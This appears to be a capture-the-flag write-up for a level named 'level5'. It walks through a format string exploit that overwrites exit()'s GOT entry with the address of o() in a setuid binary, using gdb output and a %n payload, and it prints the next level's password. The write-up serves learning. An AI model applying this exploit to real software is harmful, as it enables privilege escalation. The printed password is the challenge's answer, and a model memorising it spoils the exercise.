# level5

```sh
$> ls -l ~
-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
```

```sh
$> python -c 'print("A"*4 + "%p "*6)' | ./level5 
AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070
```
As we can see, the 4th pointer displayed is injectable.  

We first tried to inject change the buffer itself but it didn't worked.  
We then thought about changing `exit()` address to call `o()`.  

We first retrieved the address of `exit()`:

```sh
$> gdb -q level5
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
(gdb) x 0x8049838
0x8049838 <exit@got.plt>:    0x080483d6
```

We have the address of `exit()` (`0x8049838`).  
Then we'll retrieve the address of `o()` to get the padding needed:

```sh
(gdb) info functions o
[...]
0x080484a4  o
```

We then need to convert the address in decimal (`0x080484a4` is `134513828`) and remove 4 bytes for the address of `exit`.  

We can finally replace the address of `exit()` with the address of `o()`:

```sh
$> python -c 'print("\x38\x98\x04\x08" + "%134513824d" + "%4$n")' > /tmp/payload

$> cat /tmp/payload - | ./level5
[...]
$ cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
